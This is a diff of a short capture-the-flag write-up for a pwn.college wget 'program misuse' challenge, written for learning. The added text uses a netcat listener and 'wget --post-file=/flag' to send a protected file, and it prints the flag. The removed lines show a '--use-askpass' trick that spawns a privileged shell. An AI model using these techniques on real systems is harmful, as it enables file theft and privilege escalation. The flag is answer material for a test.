@@ -1,11 +1,26 @@
+# challenge: wget
+
+📅 2025-12-21
+📁 program misuse
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'nc -nlvp 8080'
+-ran: 'wget --post-file=/flag http://localhost:8080'
+-flag popped out in the first terminal
+
+## 🧑🏾‍🏫 what this challenge teaches u
+nc options:
+-n -> no DNS lookups
+-l -> listen, this means its in server mode
+-v -> verbose, prints details
+-p -> port
+wget downloads files
+in this case wget open flag as root, create a POST request and uses /flag content as body and sends it to localhost:8080
+shoutout to https://writeups.kunull.net/Pwn%20College/Program%20Misuse
+
+## 🏁 Flag  
 pwn.college{YsRhKRI0BEjMs7kC32_T5n5d-eq.dJTOxwCO4IDOxEzW}
-
-file=$(mktemp)
-chmod +x $file
-echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > $file
-wget --use-askpass=$file 0
-cat /flag
-
-
-link da cui ho fatto:
-https://medium.com/@chunguss/program-misuse-challenges-writeups-part-3-7b3307a7170e
